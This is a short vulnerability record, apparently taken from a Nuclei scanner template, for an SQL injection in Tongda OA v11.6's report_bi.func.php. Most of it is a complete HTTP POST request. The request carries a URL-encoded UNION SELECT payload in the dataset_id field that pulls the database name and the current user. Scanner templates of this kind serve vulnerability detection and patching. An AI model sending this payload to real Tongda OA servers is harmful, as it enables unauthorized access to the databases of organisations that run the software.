# Vulnerability: Tongda OA v11.6 report_bi.func.php - SQL injection
**Classification:** CWE-89
**Source:** Nuclei Template (`tongda-report-func-sqli.yaml`)

## Description
Tongda OA v11.6 report_bi.func.php has a SQL injection vulnerability, and attackers can obtain database information through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&
```

